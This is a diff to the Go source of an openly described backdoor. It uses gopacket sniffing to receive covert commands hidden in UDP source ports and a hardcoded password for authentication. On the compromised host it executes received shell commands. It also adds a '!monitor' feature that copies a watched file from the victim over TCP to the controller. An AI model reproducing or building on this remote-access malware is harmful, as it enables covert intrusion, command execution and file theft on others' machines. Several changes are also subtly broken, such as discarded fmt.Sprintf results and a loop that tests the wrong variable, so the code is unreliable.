@@ -29,8 +29,8 @@ import(
 	"os"
 	"time"
 	"os/exec"
-	"io/ioutil"
 	"reflect"
+	"io"
 	"unsafe"
 	"flag"
 	"encoding/binary"
@@ -48,6 +48,8 @@ import(
 
 const passwd = "D"; //The authentication code
 const MAX_PORT = 45535
+const CLIENT = 1
+const SERVER = 0
 const SND_CMPLETE = 3414
 const helpStr = "Client Usage Help\n" +"=================================\n" +
 "EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
@@ -59,6 +61,8 @@ var err error
 var localip net.IP
 var localmac net.HardwareAddr
 var destmac net.HardwareAddr
+var pType int
+var i int
 /* 
     FUNCTION: func main()
     RETURNS: Nothing
@@ -118,11 +122,13 @@ func main(){
 	switch *modePtr {
 	case "client":
 		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
+		pType = CLIENT
 		intiateClient(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
 		break
 	case "server":
 		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
-		beginServerListen(uint16(*portPtr), uint16(*lPortPtr))
+		pType = SERVER
+		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
 	}
 }
 /* 
@@ -161,7 +167,7 @@ func intiateClient(ip string, port, lport uint16){
 	fmt.Printf("Authentication accepted, you may now send commands.\n");
 	fmt.Printf("Type ?help for more info on sending client commands.\n");
 
-	go beginClientListen(ip, port, lport)
+	go beginListen(ip, port, lport)
 	
 	for {
 		reader := bufio.NewReader(os.Stdin);
@@ -169,6 +175,10 @@ func intiateClient(ip string, port, lport uint16){
 		input = strings.TrimSpace(input);
 		if strings.HasPrefix(input, "!") {
 			sendEncryptedData(port, "[BD]" + input, ip);
+			if strings.HasPrefix(input, "!monitor") {
+				args := strings.Split(input, " ");
+				go fileWait(ip, args[1], lport + 1)
+			}
 		} else if input == "?help" {
 			fmt.Print(helpStr);
 			continue;
@@ -177,6 +187,35 @@ func intiateClient(ip string, port, lport uint16){
 		}
 	}
 }
+
+func fileWait(ip, filename string, lport uint16){
+
+	var addr string
+	fmt.Sprintf(addr, "%s:%d", ip, lport)
+	ln, _ := net.Listen("tcp", addr)
+
+	connection, _ := ln.Accept()
+
+	fileBuffer := make([]byte, 1000)
+	var currentByte int64 = 0
+	
+	file, err := os.Create(strings.TrimSpace(filename))
+	checkError(err)
+	
+	for {
+		connection.Read(fileBuffer)
+		_, err = file.WriteAt(fileBuffer, currentByte)
+
+		currentByte += 1000
+
+		if err == io.EOF {
+			break
+		}
+	}
+	
+	file.Close()
+}
+
 func sendAuthPacket(ip, data string, port uint16){
 	
 	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
@@ -186,24 +225,13 @@ func sendAuthPacket(ip, data string, port uint16){
 	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: int(port)})
 	checkError(err);
 }
-/* 
-    FUNCTION: func intiateServer(iface string, port, lport in)
-    RETURNS: Nothing
-    ARGUMENTS: 
-                string iface : the net interface to listen on
-                int port : port to send data to
-                int lport : port to listen for data on
-
-    ABOUT:
-    Performs packet sniffing using gopacket (libpcap). 
-*/
-func beginServerListen(port, lport uint16){
+func beginListen(ip string, port, lport uint16) {
 
 	var ipLayer layers.IPv4
 	var ethLayer layers.Ethernet
 	var udpLayer layers.UDP
 
-	i := 0
+	i = 0
 	buffer := make([]byte, 10000000)
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
 	decoded := make([]gopacket.LayerType, 0, 3)
@@ -223,76 +251,62 @@ func beginServerListen(port, lport uint16){
 			continue
 		}
 
-		if ipLayer.SrcIP.String() == authenticatedAddr {
-
-			curr_bytes := buffer[i:i + 1]
-			binary.LittleEndian.PutUint16(curr_bytes, uint16(udpLayer.SrcPort))
-			i = i + 2
-			
-			if(udpLayer.DstPort == SND_CMPLETE){
-				data := decrypt_data(buffer[:(len(buffer)-1)])
-
-				if strings.HasPrefix(data, "[EXEC]") {
-					executeCommand(data, ipLayer.SrcIP.String(), port);
-				}
-				if strings.HasPrefix(data, "[BD]") {
-					executeServerCommand(data, ipLayer.SrcIP.String(), port);
-				}
-
-				buffer = buffer[:0]
-				i = 0
-			}
-		} else if uint16(udpLayer.DstPort) == lport {
-			
-			data := decrypt_data([]byte(udpLayer.Payload))
-
-			if data == passwd {
-				fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP.String());
-				authenticatedAddr = ipLayer.SrcIP.String();
-			}
-		} 
-			
-	}			
+		if pType == CLIENT {
+			buffer = clientControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
+		} else {
+			buffer = serverControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
+		}
+		
+	}
 }
-func beginClientListen(ip string, port, lport uint16) {
+func clientControl(val uint16, sIP string, port, lport uint16, buffer []byte) []byte{
+	if sIP  == localip.String() && port == lport {
+		curr_bytes := buffer[i:i + 1]
+		binary.LittleEndian.PutUint16(curr_bytes, val)
+		i = i + 2
 
-	var ipLayer layers.IPv4
-	var ethLayer layers.Ethernet
-	var udpLayer layers.UDP
-
-	i := 0
-	buffer := make([]byte, 10000000)
-	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
-	decoded := make([]gopacket.LayerType, 0, 3)
-	
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for {
-		packet, err := packetSource.NextPacket() 
-		checkError(err)
-
-		err = parser.DecodeLayers(packet.Data(), &decoded)
-		if err != nil {
-			continue
-		}
-
-		if len(decoded) != 3 {
-			fmt.Println("Not enough layers!")
-			continue
-		}
-
-		if ipLayer.SrcIP.String() == ip && uint16(udpLayer.DstPort) == lport {
-
-			curr_bytes := buffer[i:i + 1]
-			binary.LittleEndian.PutUint16(curr_bytes, uint16(udpLayer.SrcPort))
-			i = i + 2
-
-			if(udpLayer.DstPort == SND_CMPLETE){
-				fmt.Print(buffer[:(len(buffer) - 1)])
-				buffer = buffer[:0]
-				i = 0
-			}
+		if(port == SND_CMPLETE){
+			fmt.Print(buffer[:(len(buffer) - 1)])
+			buffer = buffer[:0]
+			i = 0
 		}
 	}
+
+	return buffer
+}
+
+func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []byte, payload []byte) []byte{
+
+	if sIP == authenticatedAddr {
+		
+		curr_bytes := buffer[i:i + 1]
+		binary.LittleEndian.PutUint16(curr_bytes, val)
+		i = i + 2
+		
+		if(port == SND_CMPLETE){
+			data := decrypt_data(buffer[:(len(buffer)-1)])
+
+			if strings.HasPrefix(data, "[EXEC]") {
+				executeCommand(data, sIP, dport);
+			}
+			if strings.HasPrefix(data, "[BD]") {
+				executeServerCommand(data, sIP, dport);
+			}
+
+			buffer = buffer[:0]
+			i = 0
+		}
+	} else if port  == lport {
+		
+		data := decrypt_data([]byte(payload))
+
+		if data == passwd {
+			fmt.Printf("Authcode recieved, opening communication with %s\n", sIP);
+			authenticatedAddr = sIP;
+		}
+	}
+	
+	return buffer
 }
 /* 
     FUNCTION: func  executeServerCommand(data, ip string, port int) 
@@ -355,18 +369,18 @@ func monitorFile(ip, filename string, port uint16){
 			continue;
 		}
 
-		dat, err := ioutil.ReadFile(filename);
-		checkError(err);
-
 		var target string
 		fmt.Sprintf(target, "%s:%d", ip, port)
-		conn, _ := net.Dial("tcp", "127.0.0.1:8081")
-		for {
-			
-			fmt.Fprintf(conn, string(dat))
-                }
-		//+1 to the port notifies that its a file transfer
-		return;
+		conn, _ := net.Dial("tcp", target)
+
+		file, err := os.Open(strings.TrimSpace(filename)) // For read access.
+		checkError(err)
+		
+		defer file.Close() // make sure to close the file even if we panic.
+
+		_, err = io.Copy(conn, file)
+		checkError(err)
+		return
 	}
 }
 /* 
@@ -407,14 +421,14 @@ func sendEncryptedData(port uint16, data, ip string) {
 	cryptdata := encrypt_data(data)
 	size := len(cryptdata)
 	//make data write to source port, continue till end
-	for i := 0; i <= size; i = i + 2 {
+	for p := 0; i <= size; p = p + 2 {
 
 		var buffer []byte
 		
-		if i == size {
+		if p == size {
 			buffer = craftPacket("", ip, SND_CMPLETE);
 		} else {
-			buffer = craftPacket(string(cryptdata[i:(i+1)]), ip, port); 
+			buffer = craftPacket(string(cryptdata[p:(p+1)]), ip, port); 
 		}
 		
 		if buffer == nil { // if original query was invalid
